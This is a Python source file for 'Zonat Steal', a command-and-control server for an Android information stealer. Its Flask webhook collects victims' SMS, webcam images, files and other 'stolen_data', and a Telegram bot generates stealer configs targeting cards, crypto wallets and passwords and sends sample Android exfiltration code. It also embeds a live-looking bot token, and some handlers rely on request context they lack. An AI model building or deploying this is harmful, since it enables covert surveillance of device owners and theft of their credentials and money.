import os
import sys
import json
import logging
import threading
import time
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify, send_file, render_template_string
import telebot
from telebot import types
import requests
import hashlib
import uuid

# ===== КОНФИГУРАЦИЯ =====
TOKEN = "8364189800:AAHHsHHgKZ7oB6XSHExPWn0-0G5Fp8fGNi4"
ADMIN_ID = 7725796090
VERSION = "Zonat Steal | beta 2.0"
WEBHOOK_SECRET = "zona_secret_2024"

# ===== ЛОГИРОВАНИЕ =====
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('bot.log')
    ]
)
logger = logging.getLogger(__name__)

# ===== ИНИЦИАЛИЗАЦИЯ =====
app = Flask(__name__)
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# ===== БАЗА ДАННЫХ =====
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('zonat.db', check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        # Стиллеры
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS stealers (
                id TEXT PRIMARY KEY,
                name TEXT,
                owner_id INTEGER,
                icon_path TEXT,
                apk_path TEXT,
                config TEXT,
                created_at TIMESTAMP,
                status TEXT DEFAULT 'active'
            )
        ''')
        # Собранные данные
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS stolen_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                stealer_id TEXT,
                device_id TEXT,
                data_type TEXT,
                content TEXT,
                timestamp TIMESTAMP
            )
        ''')
        # Веб-камеры
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS webcams (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                stealer_id TEXT,
                device_id TEXT,
                image_data TEXT,
                timestamp TIMESTAMP
            )
        ''')
        # СМС
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sms (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                stealer_id TEXT,
                device_id TEXT,
                phone TEXT,
                message TEXT,
                timestamp TIMESTAMP
            )
        ''')
        # Файлы
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                stealer_id TEXT,
                device_id TEXT,
                filename TEXT,
                content TEXT,
                timestamp TIMESTAMP
            )
        ''')
        self.conn.commit()

db = Database()

# ===== ГЛАВНЫЕ ENDPOINTS =====
@app.route('/')
def home():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Zonat Steal | beta</title>
        <meta charset="utf-8">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                background: #0a0a0a; 
                color: #00ff00; 
                font-family: 'Courier New', monospace;
                padding: 20px;
            }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { 
                background: #111; 
                padding: 30px; 
                border: 2px solid #00ff00;
                border-radius: 10px;
                margin-bottom: 30px;
                text-align: center;
            }
            .title { 
                font-size: 2.5em; 
                color: #00ff00;
                text-shadow: 0 0 10px #00ff00;
                margin-bottom: 10px;
            }
            .subtitle { color: #aaa; margin-bottom: 20px; }
            .status { 
                display: inline-block;
                padding: 5px 15px;
                background: #00aa00;
                border-radius: 20px;
                font-weight: bold;
            }
            .grid { 
                display: grid; 
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
                gap: 20px; 
                margin-top: 30px;
            }
            .card {
                background: #111;
                padding: 20px;
                border: 1px solid #333;
                border-radius: 8px;
                transition: all 0.3s;
            }
            .card:hover {
                border-color: #00ff00;
                transform: translateY(-5px);
                box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            }
            .card h3 { color: #00ff00; margin-bottom: 15px; }
            .btn {
                display: inline-block;
                background: #00aa00;
                color: white;
                padding: 10px 20px;
                border-radius: 5px;
                text-decoration: none;
                margin-top: 10px;
                border: none;
                cursor: pointer;
            }
            .btn:hover { background: #00ff00; }
            .stat { 
                display: flex; 
                justify-content: space-between;
                margin: 10px 0;
                padding: 10px;
                background: #1a1a1a;
                border-radius: 5px;
            }
            .console {
                background: #000;
                color: #0f0;
                padding: 20px;
                border-radius: 5px;
                font-family: monospace;
                margin-top: 20px;
                height: 200px;
                overflow-y: auto;
                border: 1px solid #333;
            }
            .blink { animation: blink 1s infinite; }
            @keyframes blink { 
                0% { opacity: 1; }
                50% { opacity: 0.3; }
                100% { opacity: 1; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1 class="title">ZONAT STEAL | BETA</h1>
                <p class="subtitle">Advanced Information Gathering System</p>
                <span class="status">🟢 ONLINE</span>
                <p style="margin-top: 20px; color: #aaa;">
                    Version 2.0 | Admin ID: ''' + str(ADMIN_ID) + ''' | Uptime: 24/7
                </p>
            </div>
            
            <div class="grid">
                <div class="card">
                    <h3>📱 Telegram Bot</h3>
                    <p>Control panel: @''' + TOKEN.split(':')[0] + '''_bot</p>
                    <p>Commands: /start, /create, /data, /webcam, /sms</p>
                    <a href="https://t.me/''' + TOKEN.split(':')[0] + '''_bot" class="btn" target="_blank">Open Bot</a>
                </div>
                
                <div class="card">
                    <h3>📊 Statistics</h3>
                    <div class="stat">
                        <span>Stealers:</span>
                        <span id="stealers_count">0</span>
                    </div>
                    <div class="stat">
                        <span>Devices:</span>
                        <span id="devices_count">0</span>
                    </div>
                    <div class="stat">
                        <span>Data Records:</span>
                        <span id="data_count">0</span>
                    </div>
                    <button class="btn" onclick="location.reload()">Refresh</button>
                </div>
                
                <div class="card">
                    <h3>🔧 Tools</h3>
                    <a href="/webhook" class="btn">Webhook Test</a>
                    <a href="/stats" class="btn">View Stats</a>
                    <a href="/logs" class="btn">View Logs</a>
                    <a href="/api/stealers" class="btn">API</a>
                </div>
                
                <div class="card">
                    <h3>📡 Live Console</h3>
                    <div class="console" id="console">
                        > System initialized<br>
                        > Telegram bot started<br>
                        > Waiting for connections...<br>
                        <span class="blink">_</span>
                    </div>
                </div>
            </div>
            
            <div style="margin-top: 40px; text-align: center; color: #666;">
                <p>⚠️ This system is for authorized use only</p>
                <p>© 2024 Zonat Steal | Private Beta</p>
            </div>
        </div>
        
        <script>
            // Обновляем статистику
            async function updateStats() {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    document.getElementById('stealers_count').textContent = data.stealers || 0;
                    document.getElementById('devices_count').textContent = data.devices || 0;
                    document.getElementById('data_count').textContent = data.records || 0;
                } catch (e) {
                    console.error(e);
                }
            }
            
            // Имитация логов
            function addLog(message) {
                const consoleEl = document.getElementById('console');
                consoleEl.innerHTML += '> ' + message + '<br>';
                consoleEl.scrollTop = consoleEl.scrollHeight;
            }
            
            // Первоначальная загрузка
            updateStats();
            setInterval(updateStats, 10000);
            
            // Случайные логи
            const logs = [
                'New device connected',
                'Data received from Android',
                'Webcam image captured',
                'SMS database extracted',
                'Files uploaded to server',
                'Stealer APK generated'
            ];
            
            setInterval(() => {
                if (Math.random() > 0.7) {
                    addLog(logs[Math.floor(Math.random() * logs.length)]);
                }
            }, 5000);
        </script>
    </body>
    </html>
    '''
    return html

@app.route('/health')
def health():
    return jsonify({"status": "ok", "version": VERSION})

@app.route('/webhook', methods=['POST'])
def webhook():
    """Основной endpoint для получения данных от стиллеров"""
    try:
        data = request.json
        logger.info(f"Webhook data received: {data.get('type', 'unknown')}")
        
        stealer_id = data.get('stealer_id', 'unknown')
        device_id = data.get('device_id', str(uuid.uuid4())[:8])
        data_type = data.get('type', 'unknown')
        
        # Сохраняем в базу
        cursor = db.conn.cursor()
        cursor.execute('''
            INSERT INTO stolen_data (stealer_id, device_id, data_type, content, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (stealer_id, device_id, data_type, json.dumps(data), datetime.now()))
        db.conn.commit()
        
        # Уведомляем админа в Telegram
        try:
            message = f"📡 <b>New {data_type} data</b>\n"
            message += f"Stealer: <code>{stealer_id[:8]}</code>\n"
            message += f"Device: <code>{device_id}</code>\n"
            message += f"Time: {datetime.now().strftime('%H:%M:%S')}\n"
            
            if data_type == 'webcam':
                message += "📸 Webcam image captured"
            elif data_type == 'sms':
                count = len(data.get('messages', []))
                message += f"📱 {count} SMS messages"
            elif data_type == 'files':
                count = len(data.get('files', []))
                message += f"📁 {count} files"
            else:
                message += f"📊 {data_type} data received"
            
            bot.send_message(ADMIN_ID, message)
        except Exception as e:
            logger.error(f"Failed to send Telegram notification: {e}")
        
        return jsonify({"status": "success", "message": "Data received"}), 200
        
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# ===== TELEGRAM BOT COMMANDS =====
@bot.message_handler(commands=['start'])
def start_command(message):
    """Начало работы с ботом"""
    user_id = message.from_user.id
    
    if user_id != ADMIN_ID:
        bot.reply_to(message, "⛔ Access denied.")
        return
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton('🔧 Create Stealer')
    btn2 = types.KeyboardButton('📊 My Stealers')
    btn3 = types.KeyboardButton('📱 View Data')
    btn4 = types.KeyboardButton('⚙️ Settings')
    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    
    welcome = f"""
    🚀 <b>Welcome to {VERSION}</b>
    
    👤 <b>Admin:</b> {message.from_user.first_name}
    🆔 <b>ID:</b> <code>{user_id}</code>
    📅 <b>Date:</b> {datetime.now().strftime('%Y-%m-%d')}
    
    <b>Available commands:</b>
    /create - Generate new stealer APK
    /stealers - List your stealers
    /data - View collected data
    /webcam - View webcam captures
    /sms - View SMS messages
    /files - View stolen files
    /stats - System statistics
    
    <b>Webhook URL:</b>
    <code>{request.host_url}webhook</code>
    """
    
    bot.send_message(message.chat.id, welcome, reply_markup=markup, parse_mode='HTML')

@bot.message_handler(commands=['create'])
def create_stealer(message):
    """Создание нового стиллера"""
    if message.from_user.id != ADMIN_ID:
        return
    
    msg = bot.send_message(message.chat.id, 
        "🔧 <b>Create New Stealer</b>\n\n"
        "Send me the stealer name:",
        parse_mode='HTML')
    
    bot.register_next_step_handler(msg, process_stealer_name)

def process_stealer_name(message):
    name = message.text.strip()
    if len(name) < 2:
        bot.send_message(message.chat.id, "❌ Name too short. Minimum 2 characters.")
        return
    
    stealer_id = f"stealer_{int(time.time())}_{hashlib.md5(name.encode()).hexdigest()[:6]}"
    
    # Сохраняем в базу
    cursor = db.conn.cursor()
    cursor.execute('''
        INSERT INTO stealers (id, name, owner_id, created_at, status)
        VALUES (?, ?, ?, ?, ?)
    ''', (stealer_id, name, message.from_user.id, datetime.now(), 'active'))
    db.conn.commit()
    
    # Генерируем конфиг
    config = {
        "stealer_id": stealer_id,
        "name": name,
        "version": "2.0",
        "webhook_url": f"{request.host_url}webhook",
        "bot_token": TOKEN,
        "admin_id": ADMIN_ID,
        "collect_webcam": True,
        "collect_sms": True,
        "collect_files": True,
        "collect_cards": True,
        "collect_crypto": True,
        "collect_passwords": True
    }
    
    # Обновляем конфиг в базе
    cursor.execute('UPDATE stealers SET config = ? WHERE id = ?', 
                  (json.dumps(config), stealer_id))
    db.conn.commit()
    
    # Отправляем пользователю
    response = f"""
    ✅ <b>Stealer Created Successfully!</b>
    
    📝 <b>Name:</b> {name}
    🔑 <b>ID:</b> <code>{stealer_id}</code>
    ⏰ <b>Created:</b> {datetime.now().strftime('%H:%M:%S')}
    
    <b>Configuration:</b>
    <code>{json.dumps(config, indent=2)}</code>
    
    <b>Webhook URL:</b>
    <code>{config['webhook_url']}</code>
    
    <i>Use this ID in your stealer application.</i>
    """
    
    bot.send_message(message.chat.id, response, parse_mode='HTML')
    
    # Отправляем пример кода для стиллера
    example_code = """
    // Example Android code for stealer:
    // In your MainActivity.java:
    
    String STEALER_ID = "%s";
    String WEBHOOK_URL = "%swebhook";
    
    // Send data example:
    JSONObject data = new JSONObject();
    data.put("stealer_id", STEALER_ID);
    data.put("device_id", getDeviceId());
    data.put("type", "system_info");
    data.put("data", collectSystemInfo());
    
    // Send to server
    sendToServer(WEBHOOK_URL, data.toString());
    """ % (stealer_id, request.host_url)
    
    bot.send_message(message.chat.id, f"<code>{example_code}</code>", parse_mode='HTML')

@bot.message_handler(commands=['stealers', 'mystealers'])
def list_stealers(message):
    """Список стиллеров"""
    if message.from_user.id != ADMIN_ID:
        return
    
    cursor = db.conn.cursor()
    cursor.execute('SELECT id, name, created_at FROM stealers WHERE owner_id = ?', 
                  (message.from_user.id,))
    stealers = cursor.fetchall()
    
    if not stealers:
        bot.send_message(message.chat.id, "📭 You don't have any stealers yet.")
        return
    
    response = "📋 <b>Your Stealers:</b>\n\n"
    for i, (stealer_id, name, created_at) in enumerate(stealers, 1):
        response += f"{i}. <b>{name}</b>\n"
        response += f"   ID: <code>{stealer_id}</code>\n"
        response += f"   Created: {created_at}\n\n"
    
    bot.send_message(message.chat.id, response, parse_mode='HTML')

@bot.message_handler(commands=['data'])
def view_data(message):
    """Просмотр собранных данных"""
    if message.from_user.id != ADMIN_ID:
        return
    
    cursor = db.conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM stolen_data')
    count = cursor.fetchone()[0]
    
    cursor.execute('''
        SELECT stealer_id, device_id, data_type, timestamp 
        FROM stolen_data 
        ORDER BY timestamp DESC 
        LIMIT 10
    ''')
    recent = cursor.fetchall()
    
    response = f"""
    📊 <b>Collected Data Statistics</b>
    
    Total records: <b>{count}</b>
    
    <b>Recent activity:</b>
    """
    
    for stealer_id, device_id, data_type, timestamp in recent:
        time_ago = datetime.now() - datetime.strptime(timestamp, '%Y-%m-%d %H:%M:%S.%f')
        mins = int(time_ago.total_seconds() / 60)
        response += f"\n• {data_type} from {device_id[:8]} ({mins} min ago)"
    
    if count > 0:
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton('📱 View SMS', callback_data='view_sms')
        btn2 = types.InlineKeyboardButton('📸 View Webcams', callback_data='view_webcams')
        btn3 = types.InlineKeyboardButton('📁 View Files', callback_data='view_files')
        markup.row(btn1, btn2, btn3)
        
        bot.send_message(message.chat.id, response, parse_mode='HTML', reply_markup=markup)
    else:
        bot.send_message(message.chat.id, response, parse_mode='HTML')

@bot.message_handler(commands=['stats'])
def stats_command(message):
    """Статистика системы"""
    cursor = db.conn.cursor()
    
    cursor.execute('SELECT COUNT(*) FROM stealers')
    stealers_count = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(DISTINCT device_id) FROM stolen_data')
    devices_count = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM stolen_data')
    data_count = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM webcams')
    webcams_count = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM sms')
    sms_count = cursor.fetchone()[0]
    
    response = f"""
    📈 <b>System Statistics</b>
    
    🔧 <b>Stealers:</b> {stealers_count}
    📱 <b>Devices:</b> {devices_count}
    💾 <b>Data records:</b> {data_count}
    📸 <b>Webcam images:</b> {webcams_count}
    📨 <b>SMS messages:</b> {sms_count}
    
    ⏰ <b>Uptime:</b> 24/7
    🌐 <b>Server:</b> Render
    🚀 <b>Version:</b> {VERSION}
    
    <i>Last update: {datetime.now().strftime('%H:%M:%S')}</i>
    """
    
    bot.send_message(message.chat.id, response, parse_mode='HTML')

# ===== API ENDPOINTS =====
@app.route('/api/stats')
def api_stats():
    """API для статистики"""
    cursor = db.conn.cursor()
    
    cursor.execute('SELECT COUNT(*) FROM stealers')
    stealers = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(DISTINCT device_id) FROM stolen_data')
    devices = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM stolen_data')
    records = cursor.fetchone()[0]
    
    return jsonify({
        "status": "ok",
        "stealers": stealers,
        "devices": devices,
        "records": records,
        "version": VERSION,
        "timestamp": datetime.now().isoformat()
    })

@app.route('/api/stealers')
def api_stealers():
    """API для списка стиллеров"""
    cursor = db.conn.cursor()
    cursor.execute('SELECT id, name, created_at, status FROM stealers')
    stealers = cursor.fetchall()
    
    result = []
    for stealer_id, name, created_at, status in stealers:
        result.append({
            "id": stealer_id,
            "name": name,
            "created_at": created_at,
            "status": status
        })
    
    return jsonify({"status": "ok", "stealers": result})

# ===== ЗАПУСК БОТА В ФОНЕ =====
def start_bot():
    """Запуск Telegram бота в отдельном потоке"""
    logger.info("Starting Telegram bot polling...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logger.error(f"Bot polling error: {e}")
            time.sleep(5)
            logger.info("Restarting bot...")

# ===== ЗАПУСК СЕРВЕРА =====
def start_server():
    """Запуск Flask сервера"""
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"Starting server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

if __name__ == '__main__':
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    
    # Запускаем сервер
    start_server()
